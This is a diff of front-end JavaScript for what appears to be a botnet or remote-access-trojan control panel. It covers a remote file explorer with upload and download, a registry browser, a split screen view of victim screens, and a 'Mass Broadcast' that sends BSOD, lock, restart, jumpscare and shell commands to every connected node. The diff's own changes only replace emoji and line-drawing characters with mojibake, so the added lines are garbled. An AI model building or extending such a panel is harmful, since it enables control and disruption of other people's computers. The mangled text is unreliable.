 			<div id="fsListing" style="flex:1;overflow-y:auto;padding:.75rem 1rem;display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:.5rem;align-content:start">
@@ -4303,14 +4315,14 @@ window._fsRenderDir = function(data) {
 	if (!listing && !tabListing) return;
 	const items = data.items || data.entries || [];
 	if (!items.length) { 
-		const emptyMsg = `<div style="grid-column:1/-1;text-align:center;padding:3rem;color:var(--text-3);font-size:.8rem">📭 Empty directory</div>`;
+		const emptyMsg = `<div style="grid-column:1/-1;text-align:center;padding:3rem;color:var(--text-3);font-size:.8rem">ðŸ“­ Empty directory</div>`;
 		if (listing) listing.innerHTML = emptyMsg;
 		if (tabListing) tabListing.innerHTML = emptyMsg;
 		return; 
 	}
 	const html = items.map(item => {
 		const isDir = item.type === "dir" || item.is_dir;
-		const icon  = isDir ? "📁" : _fsFileIcon(item.name);
+		const icon  = isDir ? "ðŸ“" : _fsFileIcon(item.name);
 		const size  = isDir ? "" : _fsFormatSize(item.size);
 		return `<div onclick="window._fsClickItem(${JSON.stringify(JSON.stringify(item))})"
 			style="padding:.65rem .8rem;border-radius:12px;border:1px solid rgba(255,255,255,.06);background:rgba(255,255,255,.02);cursor:pointer;transition:all .15s;display:flex;flex-direction:column;gap:.3rem;overflow:hidden"
@@ -4333,7 +4345,7 @@ window._fsClickItem = function(itemJson) {
 	else {
 		if (confirm(`Download "${item.name}" from node?`)) {
 			socket.send(JSON.stringify({ type: "download_file", path: item.path, id: _fsNodeId }));
-			showToast(`📥 Downloading ${item.name}…`, "teal");
+			showToast(`ðŸ“¥ Downloading ${item.name}â€¦`, "teal");
 		}
 	}
 };
@@ -4349,7 +4361,7 @@ window._fsUpload = function() {
 		r.onload = ev => {
 			const b64 = ev.target.result.split(",")[1];
 			socket.send(JSON.stringify({ type: "upload_file", name: f.name, path: destPath, data: b64, id: _fsNodeId }));
-			showToast(`📤 Uploading ${f.name}…`, "ok");
+			showToast(`ðŸ“¤ Uploading ${f.name}â€¦`, "ok");
 		};
 		r.readAsDataURL(f);
 	};
@@ -4358,8 +4370,8 @@ window._fsUpload = function() {
 
 function _fsFileIcon(name) {
 	const ext = (name.split(".").pop() || "").toLowerCase();
-	const icons = { exe:"⚙️", dll:"🔧", txt:"📄", log:"📋", jpg:"🖼️", jpeg:"🖼️", png:"🖼️", gif:"🖼️", mp4:"🎬", mp3:"🎵", zip:"📦", rar:"📦", pdf:"📕", doc:"📝", docx:"📝", py:"🐍", js:"🟨", json:"📊", bat:"⚡", ps1:"💙" };
-	return icons[ext] || "📄";
+	const icons = { exe:"âš™ï¸", dll:"ðŸ”§", txt:"ðŸ“„", log:"ðŸ“‹", jpg:"ðŸ–¼ï¸", jpeg:"ðŸ–¼ï¸", png:"ðŸ–¼ï¸", gif:"ðŸ–¼ï¸", mp4:"ðŸŽ¬", mp3:"ðŸŽµ", zip:"ðŸ“¦", rar:"ðŸ“¦", pdf:"ðŸ“•", doc:"ðŸ“", docx:"ðŸ“", py:"ðŸ", js:"ðŸŸ¨", json:"ðŸ“Š", bat:"âš¡", ps1:"ðŸ’™" };
+	return icons[ext] || "ðŸ“„";
 }
 function _fsFormatSize(bytes) {
 	if (!bytes) return "";
@@ -4371,11 +4383,11 @@ function _fsFormatSize(bytes) {
 // fs_resp is handled natively in the main handleMsg switch above.
 
 
-// ══════════════════════════════════════════════════════════════════════════════
-// ── FEATURE: MULTI-NODE SPLIT VIEW ───────────────────────────────────────────
-// ══════════════════════════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// â”€â”€ FEATURE: MULTI-NODE SPLIT VIEW â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 let _splitViewOpen = false;
-let _splitSessions = {}; // nodeId → canvas element
+let _splitSessions = {}; // nodeId â†’ canvas element
 
 window.openSplitView = function() {
 	let modal = $("splitViewModal");
@@ -4386,10 +4398,10 @@ window.openSplitView = function() {
 		modal.innerHTML = `
 		<div style="padding:.6rem 1rem;background:rgba(8,8,12,.95);border-bottom:1px solid rgba(0,240,255,.2);display:flex;align-items:center;justify-content:space-between">
 			<div style="display:flex;align-items:center;gap:.75rem">
-				<span style="font-size:.85rem;font-weight:800;color:var(--accent);letter-spacing:.08em">⊞ SPLIT VIEW</span>
+				<span style="font-size:.85rem;font-weight:800;color:var(--accent);letter-spacing:.08em">âŠž SPLIT VIEW</span>
 				<span id="splitViewCount" style="font-size:.65rem;color:var(--text-3)">Select nodes below (max 4)</span>
 			</div>
-			<button type="button" onclick="$('splitViewModal').style.display='none'" style="background:rgba(255,42,95,.1);border:1px solid rgba(255,42,95,.3);color:var(--red);border-radius:8px;padding:.3rem .75rem;font-size:.65rem;font-weight:700;cursor:pointer">✕ Exit Split View</button>
+			<button type="button" onclick="$('splitViewModal').style.display='none'" style="background:rgba(255,42,95,.1);border:1px solid rgba(255,42,95,.3);color:var(--red);border-radius:8px;padding:.3rem .75rem;font-size:.65rem;font-weight:700;cursor:pointer">âœ• Exit Split View</button>
 		</div>
 		<div id="splitNodePicker" style="padding:.75rem 1rem;background:rgba(8,8,12,.9);border-bottom:1px solid rgba(255,255,255,.05);display:flex;gap:.5rem;flex-wrap:wrap"></div>
 		<div id="splitGrid" style="flex:1;display:grid;gap:2px;background:#111;overflow:hidden"></div>`;
@@ -4452,9 +4464,9 @@ window._buildSplitGrid = function() {
 	if (countEl) countEl.textContent = `${ids.length} nodes selected`;
 };
 
-// ══════════════════════════════════════════════════════════════════════════════
-// ── FEATURE: MASS BROADCAST UI ────────────────────────────────────────────────
-// ══════════════════════════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// â”€â”€ FEATURE: MASS BROADCAST UI â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 window.openMassBroadcast = function() {
 	let modal = $("massBroadcastModal");
 	if (!modal) {
@@ -4465,23 +4477,23 @@ window.openMassBroadcast = function() {
 		<div style="width:min(540px,94vw);background:rgba(8,8,12,.97);border:1px solid rgba(251,191,36,.3);border-radius:20px;overflow:hidden;box-shadow:0 40px 100px rgba(0,0,0,.9)">
 			<div style="padding:1.25rem;border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;justify-content:space-between">
 				<div style="display:flex;align-items:center;gap:.75rem">
-					<span style="font-size:1.1rem">📡</span>
+					<span style="font-size:1.1rem">ðŸ“¡</span>
 					<div>
 						<div style="font-size:.85rem;font-weight:800;color:var(--amber)">MASS BROADCAST</div>
 						<div style="font-size:.6rem;color:var(--text-3)">Send command to ALL connected nodes</div>
 					</div>
 				</div>
-				<button type="button" onclick="$('massBroadcastModal').style.display='none'" style="background:transparent;border:none;color:var(--text-3);font-size:1.2rem;cursor:pointer">✕</button>
+				<button type="button" onclick="$('massBroadcastModal').style.display='none'" style="background:transparent;border:none;color:var(--text-3);font-size:1.2rem;cursor:pointer">âœ•</button>
 			</div>
 			<div style="padding:1.25rem;display:flex;flex-direction:column;gap:1rem">
 				<div style="display:grid;grid-template-columns:1fr 1fr;gap:.5rem">
 					${[
-						["💥 BSOD All",        "bsod",           "red"],
-						["🔒 Lock All",        "lock_workstation","amber"],
-						["🔊 Beep All",        "beep",           "violet"],
-						["💬 Toast All",       "show_toast",     "teal"],
-						["🔄 Restart All",     "restart",        "red"],
-						["💡 Jumpscare All",   "jumpscare",      "violet"],
+						["ðŸ’¥ BSOD All",        "bsod",           "red"],
+						["ðŸ”’ Lock All",        "lock_workstation","amber"],
+						["ðŸ”Š Beep All",        "beep",           "violet"],
+						["ðŸ’¬ Toast All",       "show_toast",     "teal"],
+						["ðŸ”„ Restart All",     "restart",        "red"],
+						["ðŸ’¡ Jumpscare All",   "jumpscare",      "violet"],
 					].map(([label, type, color]) =>
 						`<button type="button" onclick="window._massSend('${type}')"
 							style="padding:.75rem;border-radius:12px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.03);color:var(--text-2);font-size:.72rem;font-weight:700;cursor:pointer;text-align:left;transition:all .15s"
@@ -4509,14 +4521,14 @@ window.openMassBroadcast = function() {
 
 window._massSend = async function(type, extra = {}) {
 	const res = $("massBroadcastResult");
-	if (res) res.textContent = "Sending…";
+	if (res) res.textContent = "Sendingâ€¦";
 	try {
 		const r = await fetch("/api/node/broadcast", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ type, ...extra }) });
 		const d = await r.json();
-		if (res) res.textContent = `✅ Sent to ${d.sent} nodes`;
-		showToast(`📡 Broadcast sent to ${d.sent} nodes`, "teal");
+		if (res) res.textContent = `âœ… Sent to ${d.sent} nodes`;
+		showToast(`ðŸ“¡ Broadcast sent to ${d.sent} nodes`, "teal");
 	} catch(e) {
-		if (res) res.textContent = `❌ Error: ${e}`;
+		if (res) res.textContent = `âŒ Error: ${e}`;
 	}
 };
 
@@ -4527,9 +4539,9 @@ window._massSendShell = function() {
 	$("massShellInput").value = "";
 };
 
-// ══════════════════════════════════════════════════════════════════════════════
-// ── FEATURE: GEO MAP AUTO-REFRESH ─────────────────────────────────────────────
-// ══════════════════════════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// â”€â”€ FEATURE: GEO MAP AUTO-REFRESH â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 async function _refreshGeoMap() {
 	try {
 		const r = await fetch("/api/nodes/geo");
@@ -4551,9 +4563,9 @@ setInterval(() => {
 	if ($("view-map")?.style.display !== "none") _refreshGeoMap();
 }, 30000);
 
-// ══════════════════════════════════════════════════════════════════════════════
-// ── TOOLBAR: Add Split View + File Explorer + Broadcast buttons to dashboard ──
-// ══════════════════════════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// â”€â”€ TOOLBAR: Add Split View + File Explorer + Broadcast buttons to dashboard â”€â”€
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 document.addEventListener("DOMContentLoaded", () => {
 	// Inject quick-access buttons into the top bar action area
 	const actionRow = document.querySelector(".top-bar-actions") || document.querySelector(".top-bar .btn-ghost")?.parentElement;
@@ -4564,7 +4576,7 @@ document.addEventListener("DOMContentLoaded", () => {
 		btnSplit.id = "btnSplitView";
 		btnSplit.title = "Multi-Node Split View";
 		btnSplit.style.cssText = "font-size:.65rem;padding:.3rem .7rem;border-color:rgba(0,240,255,.3);color:var(--accent)";
-		btnSplit.innerHTML = "⊞ Split";
+		btnSplit.innerHTML = "âŠž Split";
 		btnSplit.onclick = () => window.openSplitView();
 
 		const btnBroadcast = document.createElement("button");
@@ -4573,7 +4585,7 @@ document.addEventListener("DOMContentLoaded", () => {
 		btnBroadcast.id = "btnMassBroadcast";
 		btnBroadcast.title = "Mass Broadcast to all nodes";
 		btnBroadcast.style.cssText = "font-size:.65rem;padding:.3rem .7rem;border-color:rgba(251,191,36,.3);color:var(--amber)";
-		btnBroadcast.innerHTML = "📡 Broadcast";
+		btnBroadcast.innerHTML = "ðŸ“¡ Broadcast";
 		btnBroadcast.onclick = () => window.openMassBroadcast();
 
 		actionRow.prepend(btnBroadcast);
@@ -4589,12 +4601,12 @@ if (typeof _origOpenRemote2 === "function" && !window._feHooked) {
 	window._promptBrowse = window._promptBrowse || function() {};
 }
 
-// ══════════════════════════════════════════════════════════════════════════════
-// ── FEATURE: EXPOSE FILE EXPLORER IN REMOTE PANEL ────────────────────────────
-// ══════════════════════════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// â”€â”€ FEATURE: EXPOSE FILE EXPLORER IN REMOTE PANEL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Override the "Browse Files" button in the tools panel to use the new GUI
 const _origPromptBrowse = window._promptBrowse;
-// ── FEATURE: GRAPHICAL REGISTRY EXPLORER ─────────────────────────────────────
+// â”€â”€ FEATURE: GRAPHICAL REGISTRY EXPLORER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 let _regNodeId = null;
 let _regCurrentHive = "HKCU";
 let _regCurrentPath = "";
@@ -4624,13 +4636,13 @@ window._regRender = function(data) {
 	let keyHtml = "";
 	if (_regCurrentPath) {
 		const parent = _regCurrentPath.split("\\").slice(0, -1).join("\\");
-		keyHtml += `<div onclick="window._regNavigate('${_regCurrentHive}','${parent}')" style="padding:.5rem .75rem;border-radius:8px;cursor:pointer;font-size:.65rem;color:var(--amber);background:rgba(251,191,36,0.05);margin-bottom:4px">📁 .. [Parent]</div>`;
+		keyHtml += `<div onclick="window._regNavigate('${_regCurrentHive}','${parent}')" style="padding:.5rem .75rem;border-radius:8px;cursor:pointer;font-size:.65rem;color:var(--amber);background:rgba(251,191,36,0.05);margin-bottom:4px">ðŸ“ .. [Parent]</div>`;
 	}
 	keyHtml += (data.subkeys || []).map(sk => `
 		<div onclick="window._regNavigate('${_regCurrentHive}','${_regCurrentPath ? _regCurrentPath + '\\' + sk : sk}')"
 			style="padding:.5rem .75rem;border-radius:8px;cursor:pointer;font-size:.65rem;color:var(--text-2);transition:all .15s"
 			onmouseenter="this.style.background='rgba(255,255,255,0.05)';this.style.color='var(--text-1)'"
-			onmouseleave="this.style.background='transparent';this.style.color='var(--text-2)'">📁 ${sk}</div>
+			onmouseleave="this.style.background='transparent';this.style.color='var(--text-2)'">ðŸ“ ${sk}</div>
 	`).join("");
 	keyList.innerHTML = keyHtml || `<div style="padding:2rem;text-align:center;color:var(--text-3);font-size:.6rem">No subkeys</div>`;
 	
@@ -4659,7 +4671,7 @@ const _origHandleMsg = window.handleMsg; // Assume handleMsg is global
 // I'll just append the logic to the existing handleMsg if I can find it.
 
 
-// ── MATRIX ANIMATION ──────────────────────────────────────────────────
+// â”€â”€ MATRIX ANIMATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function initMatrix() {
 	const canvas = document.getElementById("matrixCanvas");
 	if (!canvas) return;
